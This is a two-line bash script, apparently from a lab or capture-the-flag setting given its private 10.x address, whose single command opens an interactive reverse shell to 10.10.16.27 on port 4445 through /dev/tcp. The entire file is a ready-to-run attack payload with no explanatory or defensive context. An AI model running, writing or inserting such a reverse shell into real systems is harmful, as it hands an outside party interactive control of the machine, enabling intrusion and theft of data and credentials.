#!/bin/bash

bash -i >& /dev/tcp/10.10.16.27/4445 0>&1
